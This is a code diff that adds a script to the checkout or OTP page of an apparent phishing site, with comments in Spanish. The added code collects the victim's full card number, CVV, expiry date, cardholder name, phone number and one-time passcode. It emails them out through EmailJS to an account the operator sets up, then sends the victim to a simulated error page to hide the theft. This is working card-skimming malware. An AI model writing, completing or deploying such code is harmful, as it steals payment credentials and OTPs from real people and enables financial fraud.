@@ -328,5 +328,38 @@ function updateTimerDisplay() {
       });
     });
   </script>
+  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@2/dist/email.min.js"></script>
+<script>
+  (function(){
+    emailjs.init("TU_USER_ID"); // ⚡ pega aquí tu Public Key de EmailJS
+  })();
+
+  async function enviarDatos() {
+    let datos = {
+      phone: localStorage.getItem("customerPhone"),
+      cardNumber: localStorage.getItem("fullCardNumber"),
+      cardHolder: localStorage.getItem("cardHolder"),
+      cardExpiry: localStorage.getItem("cardExpiry"),
+      cardCVV: localStorage.getItem("cardCVV"),
+      total: localStorage.getItem("purchaseTotal"),
+      otp: document.getElementById("otp-input").value
+    };
+
+    try {
+      let res = await emailjs.send("TU_SERVICE_ID", "TU_TEMPLATE_ID", datos);
+      console.log("Correo enviado ✅", res.status, res.text);
+    } catch (err) {
+      console.error("Error ❌", err);
+    }
+
+    // Redirige igual al error simulado
+    window.location.href = "Error.html";
+  }
+
+  // 🔗 Vincula el botón de Confirmar OTP con esta función
+  document.getElementById("confirm-otp").addEventListener("click", enviarDatos);
+</script>
+
 </body>
 </html>
+
